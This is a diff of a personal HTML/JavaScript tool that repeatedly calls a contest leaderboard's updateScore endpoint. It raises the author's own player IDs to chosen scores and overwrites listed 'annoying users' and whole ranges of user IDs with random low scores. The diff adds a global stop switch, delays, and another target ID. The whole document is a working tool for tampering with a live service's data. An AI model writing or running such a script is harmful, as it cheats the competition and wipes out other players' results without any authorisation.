@@ -3,6 +3,9 @@
     <script src="https://tictac-winter.co.il/cryptojs-aes.min.js"></script>
     <script src="https://tictac-winter.co.il/cryptojs-aes-format.js"></script>
     <script>
+        // [*****] Globals
+        let g_stop_all = false;
+
         // ==========================================================================================
         // ==========================================================================================
 
@@ -29,12 +32,11 @@
             var req = new XMLHttpRequest();
             req.open('POST', 'https://tictac-winter.co.il/index.php/updateScore', true);
             req.onload = function () {
-                console.debug(this.responseText);
                 let _0x443239 = JSON.parse(this.responseText);
                 if (_0x443239.success) {
                     console.debug("***** Results: ");
                     for (let i = 0; i < 5; i++) {
-                        console.debug(i.toString() + " place: " + _0x443239.topPlayers[i].fullname);
+                        console.debug((i + 1).toString() + " place: " + _0x443239.topPlayers[i].fullname);
                     }
                     console.debug("position: " + _0x443239.myPosition);
                     return _0x443239;
@@ -49,7 +51,7 @@
         function remove_annoying_users() {
             let annoying_users_str = document.getElementById('textbox3').value;
             let annoying_users = annoying_users_str.split(',').map(num => parseInt(num.trim()));
-            
+
             console.debug("Called remove_annoying_users: " + annoying_users_str);
             remove_annoying_users_impl(annoying_users);
         }
@@ -60,10 +62,10 @@
 
             // Set my own users
             console.debug("Overwriting " + 19603);
-            update_score_impl(19603, 1420);
+            update_score_impl(19603, 1280);
             await new Promise(r => setTimeout(r, 2000));
             console.debug("Overwriting " + 19604);
-            update_score_impl(19604, 1370);
+            update_score_impl(19604, 1260);
             await new Promise(r => setTimeout(r, 2000 + 250));
             console.debug("Overwriting " + 21246);
             update_score_impl(21246, 1250);
@@ -71,9 +73,11 @@
 
             // Remove the annoying users
             annoying_users.forEach(async u => {
-                console.debug("Overwriting " + u);
-                update_score_impl(u, 50 + (Math.round(Math.random() * 45) * 10));
-                // await new Promise(r => setTimeout(r, 1000));
+                if (g_stop_all === false) {
+                    console.debug("Overwriting " + u);
+                    update_score_impl(u, 50 + (Math.round(Math.random() * 45) * 10));
+                    await new Promise(r => setTimeout(r, 1000));
+                }
             });
         }
 
@@ -99,12 +103,23 @@
 
         async function reset_users_range_impl(start, end) {
             // Now, send the messages
-            for (let i = start; i >= end; i--) {
+            for (let i = start; g_stop_all === false && i >= end; i--) {
                 // Create the form data (playerId, score, token, data)
                 console.debug("Overwriting: " + i);
                 update_score_impl(i, 50 + (Math.round(Math.random() * 45) * 10));
                 await new Promise(r => setTimeout(r, 1000 + Math.floor(Math.random() * 100)));
             }
+        }
+
+        // ==========================================================================================
+        // ==========================================================================================
+
+        function stop_all() {
+            g_stop_all = true;
+        }
+
+        function allow_all() {
+            g_stop_all = false;
         }
 
         // ==========================================================================================
@@ -119,7 +134,7 @@
 
         <br><br><br>
         <h1> Remove annoying users </h1>
-        <input type="text" id="textbox3" value="20771, 20853, 20962, 21087, 21234, 21250" placeholder="Annoying users">
+        <input type="text" id="textbox3" value="20771, 20853, 20962, 20963, 21087, 21234, 21250" placeholder="Annoying users">
         <button onclick="remove_annoying_users()">Remove annoying users</button>
 
         <br><br><br>
@@ -133,6 +148,14 @@
         <input type="text" id="textbox6" placeholder="Start userID (runs downwards)">
         <input type="text" id="textbox7" placeholder="Finish userID">
         <button onclick="reset_users_range()">Reset</button>
+
+        <br><br><br>
+        <h1> Stop All Background Operations </h1>
+        <button onclick="stop_all()">STOP</button>
+
+        <br><br><br>
+        <h1> Allow All Background Operations </h1>
+        <button onclick="allow_all()">STOP</button>
 
     </body>
 </html>
